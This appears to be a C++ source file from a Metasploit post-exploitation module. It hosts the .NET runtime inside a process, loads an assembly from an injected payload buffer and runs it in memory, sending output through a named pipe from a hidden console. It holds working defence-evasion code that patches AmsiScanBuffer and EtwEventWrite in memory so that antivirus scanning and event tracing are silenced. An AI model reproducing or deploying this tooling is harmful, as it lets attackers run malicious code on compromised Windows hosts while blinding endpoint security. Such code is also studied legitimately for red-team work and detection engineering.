// Author: B4rtik (@b4rtik)
// Project: Execute Assembly (https://github.com/b4rtik/metasploit-execute-assembly)
// License: BSD 3-Clause
// based on 
// https://github.com/etormadiv/HostingCLR
// by Etor Madiv

#include "stdafx.h"
#include <stdio.h>
#include <windows.h>
#include <evntprov.h>
#include "HostingCLR.h"
#include "EtwTamper.h"

// https://docs.microsoft.com/en-us/dotnet/framework/performance/etw-events-in-the-common-language-runtime
#define ModuleLoad_V2 152
#define AssemblyDCStart_V1 155
#define MethodLoadVerbose_V1 143
#define MethodJittingStarted 145
#define ILStubGenerated 88

#define ReportErrorThroughPipe(pipe, format, ...) {char buf[1024]; DWORD written; snprintf(buf, 1024, format, __VA_ARGS__); WriteFile(pipe, buf, (DWORD)strlen(buf), &written, NULL);}

// mov rax, <Hooked function address>  
// jmp rax
unsigned char uHook[] = {
	0xC3
};

#ifdef _X32
unsigned char amsipatch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
#endif
#ifdef _X64
unsigned char amsipatch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
#endif

struct Metadata
{
	unsigned int pipenameLength;
	unsigned int appdomainLength;
	unsigned int clrVersionLength;
	unsigned int argsSize;
	unsigned int assemblySize;
	unsigned char amsiBypass;
	unsigned char etwBypass;
};
DWORD METADATA_SIZE = 22;

int executeSharp(LPVOID lpPayload)
{
	HRESULT hr;

	ICLRMetaHost* pMetaHost = NULL;
	ICLRRuntimeInfo* pRuntimeInfo = NULL;
	BOOL bLoadable;
	ICorRuntimeHost* pRuntimeHost = NULL;
	IUnknownPtr pAppDomainThunk = NULL;
	_AppDomainPtr pCustomAppDomain = NULL;
	IEnumUnknown* pEnumerator = NULL;
	_AssemblyPtr pAssembly = NULL;
	SAFEARRAYBOUND rgsabound[1];
	_MethodInfoPtr pMethodInfo = NULL;
	SAFEARRAY* pSafeArray = NULL;
	VARIANT retVal;
	VARIANT obj;
	SAFEARRAY* psaStaticMethodArgs = NULL;
	SAFEARRAY* psaEntryPointParameters = NULL;
	VARIANT vtPsa;
	HANDLE pipe = NULL;

	char* pipeName = NULL;
	char* appdomainName = NULL;
	char* clrVersion = NULL;
	wchar_t* clrVersion_w = NULL;
	BYTE* arg_s = NULL;
	wchar_t* appdomainName_w = NULL;

	Metadata metadata;

	// Structure of lpPayload:
	// - Packed metadata, including lengths of the following fields
	// - Pipe name (ASCII)
	// - Appdomain name (ASCII)
	// - Clr Version Name (ASCII)
	// - Param data
	// - Assembly data
	
	memcpy(&metadata, lpPayload, METADATA_SIZE);

	BYTE* data_ptr = (BYTE*)lpPayload + METADATA_SIZE;

	pipeName = (char*)malloc((metadata.pipenameLength + 1) * sizeof(char));
	memcpy(pipeName, data_ptr, metadata.pipenameLength);
	pipeName[metadata.pipenameLength] = 0; // Null-terminate
	data_ptr += metadata.pipenameLength;

	appdomainName = (char*)malloc((metadata.appdomainLength + 1) * sizeof(char));
	memcpy(appdomainName, data_ptr, metadata.appdomainLength);
	appdomainName[metadata.appdomainLength] = 0; // Null-terminate
	data_ptr += metadata.appdomainLength;

	clrVersion = (char*)malloc((metadata.clrVersionLength + 1) * sizeof(char));
	memcpy(clrVersion, data_ptr, metadata.clrVersionLength);
	clrVersion[metadata.clrVersionLength] = 0; // Null-terminate
	data_ptr += metadata.clrVersionLength;

	// Convert to wchar
	clrVersion_w = new wchar_t[metadata.clrVersionLength + 1];
	size_t converted= 0;
	mbstowcs_s(&converted, clrVersion_w, metadata.clrVersionLength + 1, clrVersion, metadata.clrVersionLength + 1);
	
	arg_s = (unsigned char*)malloc(metadata.argsSize * sizeof(BYTE));;
	memcpy(arg_s, data_ptr, metadata.argsSize);
	data_ptr += metadata.argsSize;

	////////////////// Hijack stdout

	// Create a pipe to send data
	pipe = CreateNamedPipeA(
		pipeName, // name of the pipe
		PIPE_ACCESS_OUTBOUND, // 1-way pipe -- send only
		PIPE_TYPE_BYTE, // send data as a message stream
		1, // only allow 1 instance of this pipe
		0, // no outbound buffer
		0, // no inbound buffer
		0, // use default wait time
		NULL // use default security attributes
	);

	if (pipe == NULL || pipe == INVALID_HANDLE_VALUE) {
		//printf("[CLRHOST] Failed to create outbound pipe instance.\n");
		hr = -1;
		goto Cleanup;
	}

	// This call blocks until a client process connects to the pipe
	BOOL result = ConnectNamedPipe(pipe, NULL);
	if (!result) {
		//printf("[CLRHOST] Failed to make connection on named pipe.\n");
		hr = -1;
		goto Cleanup;
	}

	SetStdHandle(STD_OUTPUT_HANDLE, pipe);
	SetStdHandle(STD_ERROR_HANDLE, pipe);

	///////////////////// Done hijacking stdout

	rgsabound[0].cElements = metadata.assemblySize;
	rgsabound[0].lLbound = 0;
	pSafeArray = SafeArrayCreate(VT_UI1, 1, rgsabound);

	void* pvData = NULL;
	hr = SafeArrayAccessData(pSafeArray, &pvData);
	
	if (FAILED(hr))
	{
		ReportErrorThroughPipe(pipe, "[CLRHOST] Failed SafeArrayAccessData w/hr 0x%08lx\n", hr);
		goto Cleanup;
	}

	// Store assembly
	memcpy(pvData, data_ptr, metadata.assemblySize);

	hr = SafeArrayUnaccessData(pSafeArray);

	if (FAILED(hr))
	{
		ReportErrorThroughPipe(pipe, "[CLRHOST] Failed SafeArrayUnaccessData w/hr 0x%08lx\n", hr);
		goto Cleanup;
	}

	// Etw bypass
	if (metadata.etwBypass)
	{
		int ptcResult = PatchEtw(pipe);
		if (ptcResult == -1)
		{
			ReportErrorThroughPipe(pipe, "[CLRHOST] Etw bypass failed\n");
			goto Cleanup;
		}
	}
	HMODULE hMscoree = LoadLibrary("mscoree.dll");
	FARPROC clrCreateInstance = GetProcAddress(hMscoree, "CLRCreateInstance");
	if (clrCreateInstance == NULL)
	{
		ReportErrorThroughPipe(pipe, "[CLRHOST] CLRCreateInstance not present on this system.\n");
		goto Cleanup;
	}
	hr = CLRCreateInstance(CLSID_CLRMetaHost, IID_ICLRMetaHost, (VOID**)&pMetaHost);

	if (FAILED(hr))
	{
		ReportErrorThroughPipe(pipe, "[CLRHOST] CLRCreateInstance failed w/hr 0x%08lx\n", hr);
		goto Cleanup;
	}

	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, GetCurrentProcessId());
	hr = pMetaHost->EnumerateLoadedRuntimes(hProcess, &pEnumerator);

	if (FAILED(hr))
	{
		ReportErrorThroughPipe(pipe, "[CLRHOST] Cannot enumerate loaded runtime w/hr 0x%08lx\n", hr);
		goto Cleanup;
	}

	BOOL isloaded = ClrIsLoaded(clrVersion_w, pEnumerator, (VOID**)&pRuntimeInfo);

	if (!isloaded)
	{
		hr = pMetaHost->GetRuntime(clrVersion_w, IID_ICLRRuntimeInfo, (VOID**)&pRuntimeInfo);

		if (FAILED(hr))
		{
			ReportErrorThroughPipe(pipe, "[CLRHOST] Cannot get the required CLR version (%s) w/hr 0x%08lx\n", clrVersion, hr);
			goto Cleanup;
		}

		hr = pRuntimeInfo->IsLoadable(&bLoadable);

		if (FAILED(hr) || !bLoadable)
		{
			ReportErrorThroughPipe(pipe, "[CLRHOST] Cannot load the required CLR version (%s) w/hr 0x%08lx\n", clrVersion, hr);
			goto Cleanup;
		}
	}

	hr = pRuntimeInfo->GetInterface(CLSID_CorRuntimeHost, IID_ICorRuntimeHost, (VOID**)&pRuntimeHost);

	if (FAILED(hr))
	{
		ReportErrorThroughPipe(pipe, "[CLRHOST] ICLRRuntimeInfo::GetInterface failed w/hr 0x%08lx\n", hr);
		goto Cleanup;
	}

	if (!isloaded)
	{
		hr = pRuntimeHost->Start();
	}

	if (FAILED(hr))
	{
		ReportErrorThroughPipe(pipe, "[CLRHOST] CLR failed to start w/hr 0x%08lx\n", hr);
		goto Cleanup;
	}

	// Convert to wchar
	appdomainName_w = new wchar_t[metadata.appdomainLength+1];
	mbstowcs_s(&converted, appdomainName_w, metadata.appdomainLength + 1, appdomainName, metadata.appdomainLength + 1);

	hr = pRuntimeHost->CreateDomain(appdomainName_w, NULL, &pAppDomainThunk);

	if (FAILED(hr))
	{
		ReportErrorThroughPipe(pipe, "[CLRHOST] ICorRuntimeHost::CreateDomain failed w/hr 0x%08lx\n", hr);
		goto Cleanup;
	}

	hr = pAppDomainThunk->QueryInterface(__uuidof(_AppDomain), (VOID**)&pCustomAppDomain);

	if (FAILED(hr))
	{
		ReportErrorThroughPipe(pipe, "[CLRHOST] Failed to get default AppDomain w/hr 0x%08lx\n", hr);
		goto Cleanup;
	}

	// Amsi bypass
	if (metadata.amsiBypass)
	{
		int ptcResult = PatchAmsi(pipe);
		if (ptcResult == -1)
		{
			ReportErrorThroughPipe(pipe, "[CLRHOST] Amsi bypass failed\n");
			goto Cleanup;
		}
	}

	hr = pCustomAppDomain->Load_3(pSafeArray, &pAssembly);

	if (FAILED(hr))
	{
		ReportErrorThroughPipe(pipe, "[CLRHOST] Failed pCustomAppDomain->Load_3 w/hr 0x%08lx\n", hr);
		goto Cleanup;
	}

	hr = pAssembly->get_EntryPoint(&pMethodInfo);

	if (FAILED(hr))
	{
		ReportErrorThroughPipe(pipe, "[CLRHOST] Failed pAssembly->get_EntryPoint w/hr 0x%08lx\n", hr);
		goto Cleanup;
	}

	// Let's check the number of parameters: must be either the 0-arg Main(), or a 1-arg Main(string[])
	pMethodInfo->GetParameters(&psaEntryPointParameters);
	hr = SafeArrayLock(psaEntryPointParameters);
	if (!SUCCEEDED(hr))
	{
		ReportErrorThroughPipe(pipe, "[CLRHOST] Failed to lock param array w/hr 0x%08lx\n", hr);
		goto Cleanup;
	}
	long uBound, lBound;
	SafeArrayGetLBound(psaEntryPointParameters, 1, &lBound);
	SafeArrayGetUBound(psaEntryPointParameters, 1, &uBound);
	long numArgs = uBound - lBound + 1;
	hr = SafeArrayUnlock(psaEntryPointParameters);
	if (!SUCCEEDED(hr))
	{
		ReportErrorThroughPipe(pipe, "[CLRHOST] Failed to unlock param array w/hr 0x%08lx\n", hr);
		goto Cleanup;
	}

	ZeroMemory(&retVal, sizeof(VARIANT));
	ZeroMemory(&obj, sizeof(VARIANT));

	obj.vt = VT_NULL;
	vtPsa.vt = (VT_ARRAY | VT_BSTR);

	switch (numArgs)
	{
	case 0:
		if (metadata.argsSize > 1) // There is always a Null byte at least, so "1" in size means "0 args"
		{
			ReportErrorThroughPipe(pipe, "[CLRHOST] Assembly takes no arguments, but some were provided\n");
			goto Cleanup;
		}
		// If no parameters set cElement to 0
		psaStaticMethodArgs = SafeArrayCreateVector(VT_VARIANT, 0, 0);
		break;
	case 1:
	{
		// If we have at least 1 parameter set cElement to 1
		psaStaticMethodArgs = SafeArrayCreateVector(VT_VARIANT, 0, 1);

		// Here we unfortunately need to do a trick. CommandLineToArgvW treats the first argument differently, as
		// it expects it to be a filename. This affects situations where the first argument contains backslashes,
		// or if there are no arguments at all (it will just create one - the process's image name).
		// To coerce it into performing the correct data transformation, we create a fake first parameter, and then
		// ignore it in the output.

		LPWSTR* szArglist;
		int nArgs;
		wchar_t* wtext = (wchar_t*)malloc((sizeof(wchar_t) * (metadata.argsSize + 2)));
		wtext[0] = L'X'; // Fake process name
		wtext[1] = L' '; // Separator


		mbstowcs_s(&converted, wtext+2, metadata.argsSize, (char*)arg_s, metadata.argsSize);
		szArglist = CommandLineToArgvW(wtext, &nArgs);

		free(wtext);

		vtPsa.parray = SafeArrayCreateVector(VT_BSTR, 0, nArgs - 1); // Subtract 1, to ignore the fake process name

		for (long i = 1; i < nArgs; i++) // Start a 1 - ignoring the fake process name
		{
			size_t strlength = wcslen(szArglist[i]) + 1;
			OLECHAR* sOleText1 = new OLECHAR[strlength];
			char* buffer = (char*)malloc(strlength * sizeof(char));

			wcstombs_s(&converted, buffer, strlength, szArglist[i], strlength);

			mbstowcs_s(&converted, sOleText1, strlength, buffer, strlength);
			BSTR strParam1 = SysAllocString(sOleText1);
			long actualPosition = i - 1;
			SafeArrayPutElement(vtPsa.parray, &actualPosition, strParam1);
			free(buffer);
		}

		LocalFree(szArglist);

		long iEventCdIdx(0);
		hr = SafeArrayPutElement(psaStaticMethodArgs, &iEventCdIdx, &vtPsa);
		break;
	}
	default:
		ReportErrorThroughPipe(pipe, "[CLRHOST] Unexpected argument length: %d\n", numArgs);
		goto Cleanup;
	}

	//Assembly execution
	hr = pMethodInfo->Invoke_3(obj, psaStaticMethodArgs, &retVal);
	if (FAILED(hr))
	{
		ReportErrorThroughPipe(pipe, "[CLRHOST] Unhandled exception when running assembly w/hr 0x%08lx\n", hr);
		goto Cleanup;
	}

Cleanup:

	if (pipe != NULL) {
		FlushFileBuffers(pipe);
		DisconnectNamedPipe(pipe);
		CloseHandle(pipe);
	}

	if (pEnumerator) {
		pEnumerator->Release();
	}
	if (pMetaHost) {
		pMetaHost->Release();
	}
	if (pRuntimeInfo) {
		pRuntimeInfo->Release();
	}

	if (pRuntimeHost) {
		if (pCustomAppDomain) {
			pRuntimeHost->UnloadDomain(pCustomAppDomain);
		}
		pRuntimeHost->Release();
	}

	if (psaStaticMethodArgs) {
		SafeArrayDestroy(psaStaticMethodArgs);
	}
	if (pSafeArray) {
		SafeArrayDestroy(pSafeArray);
	}

	if (appdomainName) {
		free(appdomainName);
	}

	if (clrVersion) {
		free(clrVersion);
	}
	if (clrVersion_w) {
		delete[] clrVersion_w;
	}

	if (arg_s) {
		free(arg_s);
	}

	if (appdomainName_w) {
		delete[] appdomainName_w;
	}

	return hr;
}

VOID Execute(LPVOID lpPayload)
{
	// Attach or create console
	if (GetConsoleWindow() == NULL) {
		AllocConsole();
		HWND wnd = GetConsoleWindow();
		if (wnd)
		{
			ShowWindow(wnd, SW_HIDE);
		}
	}

	HANDLE stdOut = GetStdHandle(STD_OUTPUT_HANDLE);
	HANDLE stdErr = GetStdHandle(STD_ERROR_HANDLE);
	
	executeSharp(lpPayload);
	SetStdHandle(STD_OUTPUT_HANDLE, stdOut);
	SetStdHandle(STD_ERROR_HANDLE, stdErr);

}

INT InlinePatch(LPVOID lpFuncAddress, UCHAR* patch, int patchsize) {
	HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
	ZwProtectVirtualMemory = (pNtProtectVirtualMemory)GetProcAddress(hNtdll, "NtProtectVirtualMemory");
	ZwWriteVirtualMemory = (pNtWriteVirtualMemory)GetProcAddress(hNtdll, "NtWriteVirtualMemory");

	LPVOID lpBaseAddress = lpFuncAddress;
	ULONG OldProtection, NewProtection;
	SIZE_T uSize = patchsize;
	NTSTATUS status = ZwProtectVirtualMemory(NtCurrentProcess(), &lpBaseAddress, &uSize, PAGE_EXECUTE_READWRITE, &OldProtection);
	if (status != STATUS_SUCCESS) {
		return -1;
	}

	status = ZwWriteVirtualMemory(NtCurrentProcess(), lpFuncAddress, (PVOID)patch, patchsize, NULL);
	if (status != STATUS_SUCCESS) {
		return -1;
	}

	status = ZwProtectVirtualMemory(NtCurrentProcess(), &lpBaseAddress, &uSize, OldProtection, &NewProtection);
	if (status != STATUS_SUCCESS) {
		return -1;
	}

	return 0;
}

BOOL PatchEtw(HANDLE pipe)
{
	HMODULE lib = LoadLibraryA("ntdll.dll");
	if (lib == NULL)
	{
		ReportErrorThroughPipe(pipe, "[CLRHOST] Cannot load ntdll.dll");
		return -2;
	}
	LPVOID lpFuncAddress = GetProcAddress(lib, "EtwEventWrite");
	if (lpFuncAddress == NULL)
	{
		ReportErrorThroughPipe(pipe, "[CLRHOST] Cannot get address of EtwEventWrite");
		return -2;
	}

	return InlinePatch(lpFuncAddress, uHook, sizeof(uHook));
}

BOOL PatchAmsi(HANDLE pipe)
{

	HMODULE lib = LoadLibraryA("amsi.dll");
	if (lib == NULL)
	{
		ReportErrorThroughPipe(pipe, "[CLRHOST] Cannot load amsi.dll");
		return -2;
	}

	LPVOID addr = GetProcAddress(lib, "AmsiScanBuffer");
	if (addr == NULL)
	{
		ReportErrorThroughPipe(pipe, "[CLRHOST] Cannot get address of AmsiScanBuffer");
		return -2;
	}

	return InlinePatch(addr, amsipatch, sizeof(amsipatch));
}

BOOL ClrIsLoaded(LPCWSTR version, IEnumUnknown* pEnumerator, LPVOID* pRuntimeInfo) {
	HRESULT hr;
	ULONG fetched = 0;
	DWORD vbSize = 260;
	BOOL retval = FALSE;
	wchar_t currentversion[260];

	while (SUCCEEDED(pEnumerator->Next(1, (IUnknown**)pRuntimeInfo, &fetched)) && fetched > 0)
	{
		hr = ((ICLRRuntimeInfo*)*pRuntimeInfo)->GetVersionString(currentversion, &vbSize);
		if (!FAILED(hr))
		{
			if (wcscmp(currentversion, version) == 0)
			{
				retval = TRUE;
				break;
			}
		}
		((ICLRRuntimeInfo*)*pRuntimeInfo)->Release();
	}

	return retval;
}